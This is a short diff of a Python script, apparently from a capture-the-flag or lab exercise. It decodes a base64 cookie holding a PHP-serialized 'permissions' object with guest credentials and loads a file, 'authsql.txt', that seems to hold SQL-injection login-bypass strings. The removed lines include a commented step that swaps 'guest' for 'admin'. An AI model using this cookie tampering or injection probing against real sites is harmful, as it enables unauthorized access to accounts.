@@ -1,15 +1,12 @@
 import requests
 import base64
 
-pay = {'file':'login'}
 adm = {'file':'admin'}
-ru = {'file':'regular_user'}
 cookie = {'user_info':'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30='}
 filename = 'authsql.txt'
 content = None
 data={"user":"asd","pass":"123"}
 ser_obj = base64.b64decode(cookie['user_info']).decode('utf-8') # O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
-#ser_obj = ser_obj.replace('s:5:"guest"','admin',1)
 user_i = ser_obj
 with open(filename,'r') as f:
     content = f.read()
